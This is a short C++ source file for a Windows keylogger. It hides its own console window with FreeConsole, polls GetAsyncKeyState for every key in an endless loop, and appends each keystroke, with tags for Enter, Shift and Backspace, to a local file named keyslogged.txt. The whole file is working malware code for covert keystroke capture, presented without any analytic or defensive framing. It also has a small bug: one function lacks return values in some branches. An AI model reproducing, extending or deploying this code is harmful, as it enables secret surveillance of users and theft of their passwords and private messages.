#include<Windows.h>
#include<iostream>
#include<fstream>
#include<string>

using namespace std;

void File(LPCSTR text)
{
    ofstream file;
    file.open("keyslogged.txt", fstream::app);
    file << text;
    file.close();
}

bool KeysPressed(int key)
{
    switch (key)
    {
    case VK_SPACE:
        cout << " ";
        File(" ");
        break;
    case VK_RETURN:
        cout << "\n";
        File(" {ENTER} ");
        break;
    case VK_SHIFT:
        cout << " {SHIFT} ";
        File(" {SHIFT} ");
        break;
    case VK_BACK:
        cout << " {BACKSPACE} ";
        File(" {BACKSPACE} ");
        break;

    default: return false;
    }
}

int main()
{
    FreeConsole();
    unsigned char key;
    while (TRUE)
    {
        Sleep(10);
        for (key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (KeysPressed(key) == FALSE)
                {
                    cout << key;
                    ofstream file;
                    file.open("keyslogged.txt", fstream::app);
                    file << key;
                    file.close();
                }
            }
        }
    }
}
